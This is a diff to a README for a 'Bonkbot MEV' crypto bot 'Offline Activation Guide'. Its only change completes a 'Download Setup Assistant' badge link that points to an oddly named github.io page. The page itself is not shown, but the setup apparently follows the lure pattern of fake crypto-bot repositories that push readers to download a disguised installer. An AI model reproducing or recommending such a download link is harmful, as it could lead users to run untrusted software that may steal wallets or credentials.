@@ -1,6 +1,6 @@
 # Bonkbot MEV — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](bonk-bot-v-2-2-setup-to-use.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://bonk-bot-v-2-2-setup-to-use.github.io/.github)
 
 ## ⚙️ How to Use
 
